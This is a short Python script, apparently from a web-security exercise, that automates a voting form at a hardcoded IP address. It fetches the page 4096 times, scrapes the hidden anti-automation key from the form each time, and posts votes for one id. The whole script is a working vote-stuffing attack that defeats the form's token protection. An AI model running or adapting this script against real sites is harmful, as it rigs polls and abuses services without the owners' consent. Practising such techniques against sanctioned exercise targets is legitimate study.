#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup

url = "http://158.69.76.135/level1.php"
data = {"id": "4561", "holdthedoor": "holdthedoor", "key": ""}
if __name__ == "__main__":
    for i in range(0, 4096):
        session = requests.session()
        page = session.get(url)
        soup = BeautifulSoup(page.text, "html.parser")

        hidden_value = soup.find("form", {"method": "post"})
        hidden_value = hidden_value.find("input", {"type": "hidden"})
        data["key"] = hidden_value["value"]

        session.post(url, data)
